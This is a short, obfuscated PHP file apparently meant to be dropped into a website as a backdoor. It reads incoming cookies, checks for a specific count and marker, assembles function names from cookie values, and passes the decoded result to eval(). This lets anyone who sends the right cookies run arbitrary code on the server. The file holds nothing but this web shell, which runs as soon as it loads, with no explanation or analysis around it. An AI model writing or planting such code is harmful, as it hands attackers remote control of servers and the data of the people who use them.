 <?php
class bsx
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s)
            self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            05,
            023,
            0136,
            0136,
            0117,
            0135,
            0136,
            0135,
            0136,
            070
        );
    }
}
function mbc()
{
    $_x  = $_COOKIE;
    $_in = bsx::g(0);
    (count($_x) == bsx::g(1) && in_array(gettype($_x) . count($_x), $_x)) ? (($_x[bsx::g(2)] = $_x[bsx::g(3)] . $_x[bsx::g(4)]) && ($_x[bsx::g(5)] = $_x[bsx::g(6)]($_x[bsx::g(7)])) && ($_x = $_x[bsx::g(8)]($_x[bsx::g(9)])) && eval($_x)) : $_x;
}
mbc();